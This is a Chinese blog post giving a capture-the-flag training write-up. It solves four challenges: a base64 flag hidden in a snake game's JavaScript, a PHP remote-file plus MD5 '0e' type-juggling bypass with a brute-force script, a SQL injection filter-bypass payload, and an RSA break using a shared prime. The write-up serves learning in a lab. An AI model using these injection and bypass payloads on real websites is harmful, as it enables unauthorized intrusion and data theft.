<!DOCTYPE html>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>
    省赛培训班wp | 道萝岗特森&#39;s Blog
  </title>
  <meta name="description" content="hello world">
  
  <meta name="keywords" content="
  writeup
  ">
  
  <meta name="author" content="daolgts">

  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="theme-color" content="#1e2327">
  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">

  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
  

  
<script>
  var _hmt = _hmt || [];
  (function(){var hm = document.createElement("script");
    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
</script>


  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
</head>

<body id="replica-app">

<nav class="navbar-wrapper">
  <div class="navbar">
    <div class="container clearfix">
      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>

      <div class="navbar-search float-left desktop-only">
        <div class="navbar-search-form">
          <label for="gsc-i-id1">This website</label>
          <div id="google-search">
            <gcse:search></gcse:search>
          </div>
        </div>
      </div>

      <ul class="navbar-nav float-left">
        
        <li><a href="/archives">Archives</a></li>
        
        <!--  -->
        
        <li><a href="/tags">Tags</a></li>
        
        
          <li><a href="/links">Links</a></li>
        
        
          <li><a href="/about">About</a></li>
        
        
      </ul>

      <ul class="navbar-nav user-nav float-right desktop-only">
        <li class="user-nav-notification">
          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
        </li>
        <li>
          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
        </li>
        <li class="user-nav-logo">
          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
        </li>
      </ul>
    </div>
  </div>
</nav>

<div class="main-container">
  <header class="header-wrapper desktop-only">
  <div class="container header-site-detail">
    <ul class="header-toolbar">
      <li class="clearfix">
        <a href="/archives" class="header-toolbar-left"><i
                  class="fa fa-file-text"></i> Posts </a>
        <a href="/archives"
           class="header-toolbar-right"> 35 </a>
      </li>
      <li>
        <a href="/tags" class="header-toolbar-left"><i
                  class="fa fa-tags"></i> Tags </a>
        <a href="/tags"
           class="header-toolbar-right"> 17 </a>
      </li>
      <li>
        <a href="/categories" class="header-toolbar-left"><i
                  class="fa fa-folder-open"></i> Categories </a>
        <a href="/categories"
           class="header-toolbar-right"> 0 </a>
      </li>
    </ul>
    <h2 class="header-title">
      <i class="fa fa-book text-muted"></i>
      <a href="/">道萝岗特森&#39;s Blog</a>
      
      
    </h2>
  </div>

  <div class="container">
    <div class="header-tab-wrapper clearfix">
      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
    </div>
  </div>
</header>


<div class="post-container container">
  <h3>
    <i class="fa fa-user-o"></i>
    daolgts

    <span class="post-date float-right" title="{{moment(1533544408000).format('MMM DD, YYYY, h:mm:ss A')}}">
      <i class="fa fa-pencil-square-o"></i>
      {{moment(1533544408000).fromNow()}}
    </span>
  </h3>

  <article class="post-content">
    <h1>省赛培训班wp</h1>
    <h3 id="web贪吃蛇"><a href="#web贪吃蛇" class="headerlink" title="web贪吃蛇"></a>web贪吃蛇</h3><p>查看源码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对话</span></span><br><span class="line">   <span class="keyword">if</span>(len &lt;= <span class="number">60</span> &amp;&amp; len % <span class="number">10</span> == <span class="number">0</span>) &#123;</span><br><span class="line">       <span class="keyword">var</span> cheer = SAY[len/<span class="number">10</span><span class="number">-1</span>];</span><br><span class="line">       trace(cheer);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(len == <span class="number">70</span>) &#123;</span><br><span class="line">       trace(anss);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(len &lt;= <span class="number">100</span> &amp;&amp; len &gt; <span class="number">60</span>) &#123;</span><br><span class="line">       <span class="keyword">var</span> cheer = SAY[<span class="number">5</span>];</span><br><span class="line">       trace(cheer);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>在js里找anss，拼接起来base64解密得到flag<br><code>ZzJsVXR0NG9ub1VzX1NuN2E4ZQo=</code></p>
<h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>index.php~有源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'level1'</span>] !== <span class="string">'go'</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!$_GET[<span class="string">'a'</span>])</span><br><span class="line">  &#123;</span><br><span class="line">    header(<span class="string">'Location: index.php?a=1a'</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  $a=$_GET[<span class="string">'a'</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stristr($a, <span class="string">'input'</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'no no no no '</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stristr($a, <span class="string">'http'</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;正确的的道路!碰碰碰！&lt;br /&gt;"</span>;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $a2 = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($a2==<span class="string">"12345"</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"离flag又近了一步！"</span>;</span><br><span class="line">    $_SESSION[<span class="string">'level1'</span>] = <span class="string">'go'</span>;</span><br><span class="line">    header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"&lt;p class='layui-elem-quote'&gt;</span></span><br><span class="line"><span class="string">        Tips: 12345,no CRLF。</span></span><br><span class="line"><span class="string">    &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($_POST[<span class="string">'b'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'c'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p class='layui-elem-quote'&gt;&lt;a href='index.php?h=1&amp;r=1' target='_blank' class='layui-btn layui-btn-big'&gt;flag&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">          要通过这一关需要POST参数b和c!</span></span><br><span class="line"><span class="string">      &lt;/p&gt;"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">    $c = $_POST[<span class="string">'c'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(is_numeric($b))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br /&gt; b 出错!&lt;br /&gt;"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(ctype_upper($c)) || (strlen($c) &gt;= <span class="number">5</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br /&gt; c 出错!&lt;br /&gt;"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p class='layui-elem-quote'&gt;&lt;a href='index.php?h=1&amp;r=1' target='_blank' class='layui-btn layui-btn-big'&gt;flag&lt;/a&gt;&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $hack = $_GET[h];</span><br><span class="line">    $rep = $_GET[r];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((strlen($hack) &gt;= <span class="number">6</span>) || (strlen($rep) &gt;= <span class="number">6</span>)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;br /&gt; h OR r 出错!&lt;br /&gt;"</span>;</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $str1 = hash(<span class="string">'md5'</span>, $b, <span class="keyword">false</span>);</span><br><span class="line">    $str2 = strtr(hash(<span class="string">'md5'</span>, $c, <span class="keyword">false</span>), $hack, $rep);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p class='layui-elem-quote'&gt;str1 : $str1&lt;/p&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p class='layui-elem-quote'&gt;str2 : $str2&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (($str1 == $str2) &amp;&amp; !($b === $c) &amp;&amp; (strlen($c) === <span class="number">4</span>)) &#123;</span><br><span class="line">          <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;p class='layui-elem-quote'&gt;</span></span><br><span class="line"><span class="string">              $flag</span></span><br><span class="line"><span class="string">          &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第一关需要使<code>$a2==&quot;12345&quot;</code>，而题目又禁止<code>php://input</code>伪协议，提示<code>http</code></p>
<p>在本地开启web服务<br><code>python -mSimpleHTTPServer 80</code><br>放一个文件内容为12345<br>构造<code>?a=http://172.16.1.230/1.txt</code></p>
<p>进入第二关<br>需要<code>($str1 == $str2) &amp;&amp; !($b === $c) &amp;&amp; (strlen($c) === 4)</code>才能拿到flag</p>
<p>对参数的限制：</p>
<ol>
<li>b为数字</li>
<li>c为大写字母且长度为4</li>
<li>h和r长度不超过5</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$str1 = hash(&apos;md5&apos;, $b, false);</span><br><span class="line">$str2 = strtr(hash(&apos;md5&apos;, $c, false), $hack, $rep);</span><br></pre></td></tr></table></figure>

<p>这里可以把md5加密的c替换字符,而md5只有<code>0-9</code>和 <code>a-f</code></p>
<p>想到php中字符串弱类型,如果字符串值以0e开头，后边都是数字，再与数字比较，就会被解释成0*10^n还是为0，就会被判断相等</p>
<p>构造b=240610708,则md5机密后str1为0exxxx的形式<br>所以把abcdf替换为00000，则有可能也为0exxxx的形式，则相等</p>
<p>上脚本爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://172.16.0.223:10025/index.php?h=bcdaf&amp;r=00000"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">r.get(<span class="string">"http://172.16.0.223:10025/index.php?a=http://172.16.1.230/1.txt"</span>)</span><br><span class="line">s=<span class="string">r'ABCDEFGHIJKLMNOPQRST'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> s :</span><br><span class="line">                    payload=i+j+k+l;</span><br><span class="line">                    <span class="keyword">print</span> payload</span><br><span class="line">                    a=&#123;<span class="string">'b'</span>:<span class="number">240610708</span>,<span class="string">'c'</span>:payload&#125;</span><br><span class="line">                    <span class="keyword">print</span> r.post(url,data=a).content</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> r.post(url,data=a).content:</span><br><span class="line">                        <span class="keyword">print</span> payload</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>(本来以为会有”flag{xx}”出现，然鹅并没有，碰巧看到了。。。这里把判断是否出现flag改为页面字符长度是否改变)</p>
<h3 id="web-google"><a href="#web-google" class="headerlink" title="web_google"></a>web_google</h3><p>提示的很清楚了，过滤了一些字符，绕过就行<br>payload :<code>?q=a&#39;Union/*1*/Select/*1*/flag,2,3/*1*/fRom/*1*/flag_is_here%23</code></p>
<h3 id="rseeyb"><a href="#rseeyb" class="headerlink" title="rseeyb"></a>rseeyb</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,long_to_bytes,bytes_to_long</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_arg</span><span class="params">(i)</span>:</span></span><br><span class="line">    p=getPrime(<span class="number">1024</span>)</span><br><span class="line">    q=getPrime(<span class="number">1024</span>)</span><br><span class="line">    open(<span class="string">"log"</span>+str(i)+<span class="string">".txt"</span>,<span class="string">"w"</span>).write(hex(p)+<span class="string">"\n"</span>+hex(q))</span><br><span class="line">    n=p*q</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line">    <span class="keyword">return</span> n,e,p,q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bosssay</span><span class="params">()</span>:</span></span><br><span class="line">    n,e,p,q=gen_arg(<span class="number">0</span>)</span><br><span class="line">    m=bytes_to_long(flag)</span><br><span class="line">    c=pow(m,e,n)</span><br><span class="line">    open(<span class="string">"boss.txt"</span>,<span class="string">"w"</span>).write(hex(c)+<span class="string">"\n"</span>+hex(n))</span><br><span class="line">    tigersay(c,p,e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tigersay</span><span class="params">(c,p,e)</span>:</span></span><br><span class="line">    q=getPrime(<span class="number">1024</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    cc=pow(c,e,n)</span><br><span class="line">    open(<span class="string">"tiger.txt"</span>, <span class="string">"w"</span>).write(hex(cc) + <span class="string">"\n"</span> + hex(n))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    bosssay()</span><br></pre></td></tr></table></figure>

<p>要求flag，需要解出m<br>而p，q是随机生成的质数，n也随机，但是在tigersay函数里传入了相同p，并且从文件里能得到两个n</p>
<p>即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p1*q1=n1</span><br><span class="line">p1*q2=n2</span><br></pre></td></tr></table></figure>

<p>求最大公约数即可求出p，接着求出n<br>已知p，q，e即可求出d<br>得到d就可以得到m，求得flag</p>
<p>求p</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">a= int(<span class="string">'0x9254d235f837be7093dadd7e89af96c43a919a0198b9e7f378a690fe8c655a42dffdaad9d985de77df36b1a9a192f20af40c4f14b2bd7456c98ee975ec0c92e1350f110545a1de0351e2cb0683a3b80403634fc12d0fd8b39ec70af2b1adbc73290e060d27ebbf3c7ec3934a3d6d0bd6baff1fc4ef1a59e9eb549dbfdfe6197291c2f064955841dab974ac604d4797e7667c2fd7101df03e879a93e5307248be18f01959c8e818fe98bff70fc953418ef17517d96a0b38e35e037f9cd39b6efe801f88720d9b2b4d7299dcc620eca99f8e13da58fbea7fbab2742dd6eb7de46c2951c299eaf3187b554bada1f47b8e899a93527558491610b9f018b8ea5ce921'</span>,<span class="number">16</span>)</span><br><span class="line">b= int(<span class="string">'0xe543df8c958aa57dbaea1ec39c192e5a8b26a64fbdcb3073ba388bc189fb645afd600b25660361df4261f4d06c96196f891f66d216519fdf3141848b69c335b74c725cca30904b46d66df286241dcb0dc030c8fb461a3e269a167a0eb53edd8b1fb56f74279e3575ac3c097c176e0648ce7ae7094fcb19202770fa47db42e2247a58575e3b15e7883ea46e525a83545866bc56f94459c8973cd8637127ffa1b640832f4b9dd9d5d8f967ccd3cb2fd222b2fcdef0a253dc306b4882e7e3f68a1250eab579a98f818696f99c68baae6cdf0634f718197e47d7f1e0a4f7b251f95958632e53465ed7d414a9ab9df6687b89dd04840a52c3e0bc39d1d1753e52ce6d'</span>,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> gcd(a,b)</span><br></pre></td></tr></table></figure>

<p>求d</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">172065274198469189283258716424446639773480626144334666332478217946919793335602221300934660008232589355869707615568396174912658652274737343045515395260992451036815064822752321636897666620519427304650758819067183595079837669597720555459781664173209246049359959646976532109655213507238169247598408455347594122469</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">107358207355730736936889083588800229444187884634054259953241331748575375310111476765364237880870359959162518892064193664135467809538414994442476728730509181761387417634298093397849594799616939842557971048106559229367803451860384013747556580201683919504103040210551672981061719111972580224275121441431057701773</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>

<p>求m</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,long_to_bytes,bytes_to_long</span><br><span class="line"></span><br><span class="line">c=<span class="number">7227205058970917253988697272348629072390742730442079261849578753481528018734243776906928810426466711340893496456684228915781322418699561381615396497213577612459731019244931946960529198136200125770814185660801019344503988528919155161210054032498490653811789195374068721678191531695543450594060714122907514239407158295416162414682815878753567087081549537449887383514261265616895987906117428228003018537805648300967622300154073730197361122372486381575741009333643822321470837038252958232982771343391969736104839542012120480213479803517978736879018055329258472236889803298431730999776160072273717790635931420082199722637</span></span><br><span class="line"></span><br><span class="line">d=<span class="number">9190506549030717721645205476165975712158417357992695314425592798265953098722816456463164481372835090232053278464116605067243715894518126968769488722268194649568809839519390988991663676909516975703254530413358310674133837270112006159784792878019684593975770310326973853269103107142247044945160889006130724582944837573873770180752269571959144161340357150024549558740219011126543123287362749998825055227640689726443364874091297444906252238737394459533134164632385241481222433068249524304622285059459643198031906649202438827609842195056980865745999310153318955309918072652249898298376252462873020768565340722078151516321</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">18472619386119921098063602750766409564120904078720703944719072416731760051248151325131154100954778056447834009406330428335028872249863046284495061718434971255253361051726134062612606955579310986832613388937626927763316852517062213938962644017873276980782373146902376416049107843120328914450438851217407510795607149055956619000499773971192981608276828988640098563504566796588712879216893620371181362602771841009871176509267913418966578678280447335170106267017712501072595986597204652731859164012966111251650153717654643071183402267794648610132185106594057257258857734796205184320940954506572252327466572125289840437537</span></span><br><span class="line"></span><br><span class="line">m = pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(m)</span><br></pre></td></tr></table></figure>

<p>（比较菜就没写到一个脚本里）</p>

  </article>
</div>


    




</div>

<div class="footer-wrapper container">
  <footer class="footer clearfix">
    <div class="clearfix">
    <a href="https://daolgts.github.io" class="footer-logo">
      <i class="fa fa-github"></i>
    </a>
    <ul class="footer-social-link">
      <li>© 2019 daolgts</li>
      <li><a href="https://daolgts.github.io">Home</a></li>
      
      <li><a href="https://github.com/daolgts">Github</a></li>
      
    </ul>
    <div class="footer-theme-info">
      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
    </div>
    </div>
    
  </footer>
</div>


<script>
  (function() {
    var cx = '005157513716557594323:jvii0oiejlb';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
      '//cse.google.com/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>



<script src="/js/main.js"></script>

</body>
</html>
